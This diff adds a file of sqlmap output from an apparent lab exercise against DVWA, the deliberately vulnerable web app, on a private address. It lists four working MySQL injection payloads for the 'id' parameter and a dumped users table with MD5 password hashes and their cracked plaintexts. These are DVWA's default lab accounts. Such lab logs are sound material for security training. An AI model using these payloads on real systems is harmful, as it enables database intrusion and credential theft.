@@ -1,0 +1,35 @@
+sqlmap identified the following injection point(s) with a total of 160 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 8424=8424#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND ROW(4477,8829)>(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(4477=4477,1))),0x71787a7071,FLOOR(RAND(0)*2))x FROM (SELECT 9945 UNION SELECT 2232 UNION SELECT 1181 UNION SELECT 6797)a GROUP BY x)-- ferm&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1041 FROM (SELECT(SLEEP(5)))Nzls)-- FnSH&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x67446d4e516d4f4b4f79756b4c5358467753756149796c776c787342695973516c61667270664379,0x71787a7071)#&Submit=Submit
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 4.1
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
+| user_id | user    | avatar                                                | password                                    | last_name | first_name |
++---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
+| 1       | admin   | http://192.168.56.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
+| 2       | gordonb | http://192.168.56.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
+| 3       | 1337    | http://192.168.56.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
+| 4       | pablo   | http://192.168.56.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
+| 5       | smithy  | http://192.168.56.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
++---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
+
